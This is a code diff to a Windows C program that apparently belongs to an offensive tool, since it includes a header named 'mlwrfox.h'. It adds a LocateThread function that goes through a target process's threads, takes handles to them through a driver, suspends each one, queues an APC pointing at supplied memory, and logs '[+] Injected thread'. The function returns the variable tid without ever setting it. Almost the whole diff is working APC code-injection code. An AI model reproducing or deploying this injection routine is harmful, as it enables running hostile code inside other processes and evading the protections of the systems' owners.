@@ -7,6 +7,7 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <stdio.h>
+#include "mlwrfox.h"
 
 DWORD LocateProcess(
   PCHAR szProcessName
@@ -38,4 +39,56 @@ DWORD LocateProcess(
   CloseHandle(hProcSnap);
 
   return pid;
+};
+
+DWORD LocateThread(
+  HANDLE hDriver,
+  DWORD dwProcId,
+  LPVOID pMemory,
+  LPVOID pParam
+)
+{
+  HANDLE hThrdSnap;
+  THREADENTRY32 pThrd32;
+  DWORD tid;
+
+  hThrdSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcId);
+  if ( hThrdSnap == INVALID_HANDLE_VALUE )
+	return (0);
+
+  pThrd32.dwSize = sizeof(THREADENTRY32);
+  if ( !Thread32First(hThrdSnap, &pThrd32) ) {
+	CloseHandle(hThrdSnap);
+	return 0;
+  };
+
+  do 
+  {
+    
+    if ( dwProcId == pThrd32.th32OwnerProcessID )
+    {
+      HANDLE hThread = NULL;
+
+      AcquireThread(hDriver, &pThrd32.th32ThreadID,
+		   &hThread);
+
+      SuspendThread(hThread);
+
+      QueueUserAPC(
+	(PAPCFUNC)pMemory,
+	(HANDLE)hThread,
+	(LPVOID)pParam
+      );
+
+      printf("[+] Injected thread %i\n", pThrd32.th32ThreadID);
+
+      ResumeThread(hThread);
+
+      CloseHandle(hThread);
+    };
+  } while ( Thread32Next(hThrdSnap, &pThrd32) );
+
+  CloseHandle(hThrdSnap);
+
+  return tid;
 };
